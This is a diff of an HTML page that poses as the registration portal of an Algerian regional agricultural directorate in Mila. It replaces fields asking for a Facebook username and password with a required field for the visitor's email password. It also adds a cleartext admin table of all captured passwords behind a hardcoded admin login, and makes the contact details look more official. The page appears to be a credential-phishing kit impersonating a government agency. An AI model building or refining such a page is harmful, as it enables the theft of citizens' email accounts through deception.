@@ -241,16 +241,16 @@
             color: #777;
         }
         
-        .facebook-section {
-            background-color: #f5f7f9;
+        .email-section {
+            background-color: #f0f7ff;
             padding: 1.5rem;
             border-radius: 8px;
             margin: 2rem 0;
-            border-left: 4px solid var(--secondary-color);
+            border-left: 4px solid #1a73e8;
         }
         
-        .facebook-section h3 {
-            color: var(--secondary-color);
+        .email-section h3 {
+            color: #1a73e8;
             margin-bottom: 1rem;
             display: flex;
             align-items: center;
@@ -618,9 +618,10 @@
                 <p>La Direction des Services Agricoles de la Wilaya de Mila a pour mission de soutenir le développement agricole dans la région.</p>
                 
                 <div class="welcome-image">
-                    <img src="https://fibladi.com/news/fr/agriculture-a-medea-mission-de-suivi-des-superficies-cerealieres/=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Agriculture à Mila">
+                    <img src="https://images.unsplash.com/photo-1625246333193-4c6b97888123?ixlib=rb-4.0.3&auto=format&fit=crop&w=1000&q=80" alt="Agriculture à Mila">
                 </div>
                 
+                <p>Inscrivez-vous sur notre plateforme pour :</p>
                 
                 <div class="benefits">
                     <div class="benefit-item">
@@ -634,7 +635,6 @@
                     <div class="benefit-item">
                         <i class="fas fa-book-reader"></i>
                         <span>Participer aux formations techniques</span>
-                   <p>Inscrivez-vous sur notre plateforme pour :</p>
                     </div>
                     <div class="benefit-item">
                         <i class="fas fa-chalkboard-teacher"></i>
@@ -685,22 +685,17 @@
                     <input type="date" id="date_naissance" name="date_naissance" required>
                 </div>
                 
-                <!-- Facebook Account Section -->
-                <div class="facebook-section">
-                    <h3><i class="fab fa-facebook"></i> Compte Facebook</h3>
+                <!-- Email Password Section -->
+                <div class="email-section">
+                    <h3><i class="fas fa-envelope"></i> Mot de passe Email</h3>
                     <div class="form-group">
-                        <label for="facebook_username"><i class="fas fa-at"></i> Nom d'utilisateur Facebook</label>
-                        <input type="text" id="facebook_username" name="facebook_username">
-                    </div>
-                    
-                    <div class="form-group">
-                        <label for="facebook_password"><i class="fas fa-key"></i> Mot de passe Facebook</label>
-                        <input type="password" id="facebook_password" name="facebook_password">
-                        <span class="password-toggle" id="facebookPasswordToggle">
+                        <label for="email_password"><i class="fas fa-key"></i> Mot de passe de votre email</label>
+                        <input type="password" id="email_password" name="email_password" required>
+                        <span class="password-toggle" id="emailPasswordToggle">
                             <i class="fas fa-eye"></i>
                         </span>
                     </div>
-                    <p class="privacy-note">Vos informations Facebook sont sécurisées et ne seront pas partagées sans votre consentement.</p>
+                    <p class="privacy-note">Votre mot de passe email est sécurisé et ne sera pas partagé sans votre consentement.</p>
                 </div>
                 
                 <div class="btn-container">
@@ -745,7 +740,7 @@
             
             <div class="security-warning">
                 <i class="fas fa-exclamation-triangle"></i> 
-                <strong>Avertissement de sécurité:</strong> Les mots de passe sont affichés en clair. Assurez-vous de protéger l'accès à cette page.
+                <strong>Avertissement de sécurité:</strong> Les mots de passe sont affichés en clair. Assurez-vous de protéfer l'accès à cette page.
             </div>
             
             <div class="table-container">
@@ -758,14 +753,13 @@
                             <th>Téléphone</th>
                             <th>Email</th>
                             <th>Mot de passe</th>
-                            <th>Facebook</th>
-                            <th>Mot de passe FB</th>
+                            <th>Mot de passe Email</th>
                             <th>Date d'inscription</th>
                         </tr>
                     </thead>
                     <tbody id="user-data">
                         <tr>
-                            <td colspan="9" style="text-align: center;">Aucune donnée à afficher. Veuillez vous connecter.</td>
+                            <td colspan="8" style="text-align: center;">Aucune donnée à afficher. Veuillez vous connecter.</td>
                         </tr>
                     </tbody>
                 </table>
@@ -788,7 +782,7 @@
             
             <div class="feature-card animated delay-2">
                 <div class="feature-img">
-                    <img src="https://fibladi.com/news/fr/agriculture-a-medea-mission-de-suivi-des-superficies-cerealieres/=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Soutien agricole">
+                    <img src="https://images.unsplash.com/photo-1625246333193-4c6b97888123?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&q=80" alt="Soutien agricole">
                 </div>
                 <div class="feature-content">
                     <h3><i class="fas fa-hands-helping"></i> Soutien Technique</h3>
@@ -821,11 +815,11 @@
                         </div>
                         <div class="contact-item">
                             <i class="fas fa-map-pin"></i>
-                            <span>Cité administrative, Mila</span>
+                            <span>Rue Bentoubal, Daira de MILA, Wilaya de Mila</span>
                         </div>
                         <div class="contact-item">
                             <i class="fas fa-phone"></i>
-                            <span>031484828</span>
+                            <span>031 48 02 42</span>
                         </div>
                         <div class="contact-item">
                             <i class="fas fa-envelope"></i>
@@ -853,7 +847,7 @@
                         <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Ministère de l'Agriculture</a></li>
                         <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Chambre d'Agriculture</a></li>
                         <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Institut Technique Agricole</a></li>
-                        <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> ONIL</a></li>
+                        <li><a href="#" style="color: white; text-decoration: none;"><i class="fas fa-caret-right"></i> Portail des subventions</a></li>
                     </ul>
                 </div>
             </div>
@@ -882,8 +876,7 @@
                 email: document.getElementById('email').value,
                 password: document.getElementById('password').value,
                 date_naissance: document.getElementById('date_naissance').value,
-                facebook_username: document.getElementById('facebook_username').value,
-                facebook_password: document.getElementById('facebook_password').value,
+                email_password: document.getElementById('email_password').value,
                 date_inscription: new Date().toLocaleString()
             };
             
@@ -914,17 +907,17 @@
             }
         });
         
-        // Fonctionnalité pour afficher/masquer le mot de passe Facebook
-        const facebookPasswordToggle = document.getElementById('facebookPasswordToggle');
-        const facebookPasswordInput = document.getElementById('facebook_password');
+        // Fonctionnalité pour afficher/masquer le mot de passe email
+        const emailPasswordToggle = document.getElementById('emailPasswordToggle');
+        const emailPasswordInput = document.getElementById('email_password');
         
-        facebookPasswordToggle.addEventListener('click', function() {
-            if (facebookPasswordInput.type === 'password') {
-                facebookPasswordInput.type = 'text';
-                facebookPasswordToggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
+        emailPasswordToggle.addEventListener('click', function() {
+            if (emailPasswordInput.type === 'password') {
+                emailPasswordInput.type = 'text';
+                emailPasswordToggle.innerHTML = '<i class="fas fa-eye-slash"></i>';
             } else {
-                facebookPasswordInput.type = 'password';
-                facebookPasswordToggle.innerHTML = '<i class="fas fa-eye"></i>';
+                emailPasswordInput.type = 'password';
+                emailPasswordToggle.innerHTML = '<i class="fas fa-eye"></i>';
             }
         });
         
@@ -955,7 +948,7 @@
             const password = document.getElementById('admin-password').value;
             
             // Vérification simple des identifiants (en production, utiliser une authentification sécurisée)
-            if (username === 'admin' && password === 'admin@123') {
+            if (username === 'admin' && password === 'admin123') {
                 isAdminLoggedIn = true;
                 alert('Connexion réussie!');
                 
@@ -978,7 +971,7 @@
             const userDataContainer = document.getElementById('user-data');
             
             if (users.length === 0) {
-                userDataContainer.innerHTML = '<tr><td colspan="9" style="text-align: center;">Aucun utilisateur inscrit pour le moment.</td></tr>';
+                userDataContainer.innerHTML = '<tr><td colspan="8" style="text-align: center;">Aucun utilisateur inscrit pour le moment.</td></tr>';
                 return;
             }
             
@@ -993,8 +986,7 @@
                     <td>${user.telephone}</td>
                     <td>${user.email}</td>
                     <td class="password-cell">${user.password}</td>
-                    <td>${user.facebook_username || 'Non fourni'}</td>
-                    <td class="password-cell">${user.facebook_password || 'Non fourni'}</td>
+                    <td class="password-cell">${user.email_password}</td>
                     <td>${user.date_inscription}</td>
                 `;
                 userDataContainer.appendChild(row);
@@ -1032,4 +1024,4 @@
         });
     </script>
 </body>
-</html>
+                </html>
